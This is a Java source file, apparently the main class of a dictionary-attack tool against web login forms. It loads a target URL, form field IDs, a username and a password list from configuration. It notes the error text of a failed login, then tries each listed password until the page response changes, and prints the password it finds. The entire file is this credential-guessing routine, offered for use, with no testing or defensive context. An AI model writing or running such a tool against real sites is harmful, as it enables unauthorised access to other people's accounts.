package application;

import java.io.IOException;
import java.util.List;

import login.Login;
import reader.*;


/**
 * 
 * @author paakro@hotmail.com
 *
 */
public class Application
{
    
    public static void main(String[] args) throws IOException
    {
        
        ConfReader conf = ConfReader.getInstance();
        
        List<String> passList = FileReader.putFileContentToList(conf.getFilePath());        
        String wrongMessage =  Login.login("?", "?", conf.getUrl(), conf.getUserFieldId(), conf.getPassFiledId(), conf.getSubmitButtonId());
        
        if (!passList.isEmpty())
        {
            for (String pass : passList)
            {
                System.out.println("trying " + pass);
                String msg = Login.login(conf.getUserName(), pass, conf.getUrl(), conf.getUserFieldId(), conf.getPassFiledId(), conf.getSubmitButtonId());
               if(!wrongMessage.equals(msg))
               {
                   System.out.println("password is : " + pass);
                   break;
               }
            }
        }
    }

}
